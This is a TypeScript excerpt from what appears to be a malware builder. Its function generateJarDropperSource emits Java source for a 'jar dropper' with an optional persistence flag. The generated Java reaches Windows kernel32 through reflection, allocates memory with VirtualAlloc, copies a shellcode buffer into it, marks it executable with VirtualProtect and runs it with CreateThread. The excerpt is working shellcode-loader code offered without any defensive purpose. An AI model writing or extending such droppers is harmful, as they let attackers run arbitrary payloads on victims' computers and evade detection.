...
function generateJarDropperSource(jarPersist: boolean): string {
  ...
  return [
    ...
    "    Object fVA=gf.invoke(null,\"kernel32\",\"VirtualAlloc\");",
    "    Object addr=iv.invoke(fVA,PC,new Object[]{NP,(long)sc.length,0x3000,0x04});",
    "    log(\"addr=\"+addr);",
    "    if(addr==null||addr.equals(NP))return;",
    "    PC.getMethod(\"write\",long.class,byte[].class,int.class,int.class).invoke(addr,0L,sc,0,sc.length);",
    "    log(\"copied\");",
    "    Object oldP=MC.getConstructor(long.class).newInstance(4L);",
    "    Object fVP=gf.invoke(null,\"kernel32\",\"VirtualProtect\");",
    "    iv.invoke(fVP,Boolean.class,new Object[]{addr,(long)sc.length,0x20,oldP});",
    "    log(\"protected\");",
    "    Object fCT=gf.invoke(null,\"kernel32\",\"CreateThread\");",
    "    Object ht=iv.invoke(fCT,PC,new Object[]{NP,0L,addr,NP,0,NP});",
    "    log(\"thread=\"+ht);",
    "  }",
    "}",
  ].join("\n");
